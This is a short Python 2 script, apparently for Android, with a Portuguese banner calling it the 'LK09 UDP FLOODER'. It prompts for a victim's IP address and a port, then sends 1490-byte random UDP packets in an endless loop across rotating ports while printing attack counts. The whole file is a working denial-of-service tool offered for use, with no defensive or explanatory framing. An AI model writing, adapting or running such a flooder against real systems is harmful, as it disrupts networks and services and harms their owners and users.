#!/system/bin/python
import socket, os, random, time

# Color
B = '\033[1m'
R = '\033[31m'
N = '\033[0m'

# Code time ##################
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
##############################

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system("clear")
print ""+B+""+R+"|-_-_-_-_-_-_-_-_-_-_-_-_-_-_-|"
print "|         by: H4p3x           |"
print "| C0NH3C1M3NT0 N40 3 CR1M3    |"
print "|      LK09 UDP FLOODER       |"
print "|-_-_-_-_-_-_-_-_-_-_-_-_-_-_-|"+N+""

print ""+B+""+R+"  /=\=/=\=/=\ [$] ~>LK09<~ [$] /=\=/=\=/=\="+N+""
ip = raw_input(' IP DA VITIMA: ')
port = input(' PORTA: ')
os.system("clear")
print "|_Ataque iniciado_|  {0}.{1} | {2}-{3}-{4}".format(hour, minute, day, month, year)
time.sleep(1)
print
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Atacando %s  %s Porta:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
